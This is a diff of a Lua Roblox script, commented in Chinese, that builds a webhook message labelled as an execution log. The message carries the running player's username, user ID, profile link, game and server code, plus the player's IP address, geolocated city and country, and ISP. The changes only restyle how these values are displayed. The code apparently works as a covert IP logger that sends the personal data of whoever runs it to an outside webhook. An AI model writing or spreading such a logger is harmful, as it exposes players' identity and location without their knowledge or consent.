@@ -59,17 +59,20 @@ pcall(function()
     -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
-    -- 4. 準備 embed 的 fields 陣列 (移除舊的大標題)
+    -- 4. 準備 embed 的 fields 陣列
     local fields = {
-        -- 第一行並排
+        -- 第一行: 玩家顯示名稱
+        { name = "玩家:", value = "```" .. LocalPlayer.DisplayName .. "```", inline = false },
+        
+        -- 第二行並排
         { name = "真實名稱:", value = "```" .. LocalPlayer.Name .. "```", inline = true },
         { name = "ID:", value = "```" .. tostring(LocalPlayer.UserId) .. "```", inline = true },
-        { name = "個人資料:", value = "[點擊查看](" .. profileUrl .. ")", inline = true },
+        { name = "個人資料:", value = string.format("```[%s](%s)```", "點擊查看", profileUrl), inline = true },
 
-        -- 第二行 (單獨一行)
+        -- 第三行
         { name = "遊戲:", value = "```" .. gameName .. "```", inline = false },
 
-        -- 第三行 (單獨一行)
+        -- 第四行
         { name = "加入代碼:", value = "```" .. (game.JobId or "N/A") .. "```", inline = false },
     }
 
@@ -79,21 +82,19 @@ pcall(function()
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
         local isp = (ip_info and ip_info.org) or "未知"
         
-        -- 添加分隔線和大標題
-        table.insert(fields, { name = "\u{200B}", value = "────────── **玩家IP資訊** ──────────", inline = false })
+        -- 添加 IP 資訊大標題
+        table.insert(fields, { name = "\u{200B}", value = "**玩家IP資訊**", inline = false })
         
-        -- 添加 IP 資訊 (使用劇透標籤)
-        table.insert(fields, { name = "IP 地址:", value = "||" .. secretInfo.ip .. "||", inline = false })
-        table.insert(fields, { name = "推測位置:", value = "||" .. location .. "||", inline = false })
-        table.insert(fields, { name = "網路供應商:", value = "||" .. isp .. "||", inline = false })
+        -- 添加 IP 資訊內容 (使用黑色程式碼框)
+        table.insert(fields, { name = "IP 地址:", value = "```" .. secretInfo.ip .. "```", inline = false })
+        table.insert(fields, { name = "推測位置:", value = "```" .. location .. "```", inline = false })
+        table.insert(fields, { name = "網路供應商:", value = "```" .. isp .. "```", inline = false })
     end
 
     -- 6. 構建並發送最終的 webhook 資料
     local data = {
         username = "執行日誌",
         embeds = {{
-            title = "玩家: " .. LocalPlayer.DisplayName, -- 將顯示名稱設為大標題
-            url = profileUrl, -- 讓大標題可以點擊跳轉到個人檔案
             color = embedColor,
             fields = fields,
             footer = {
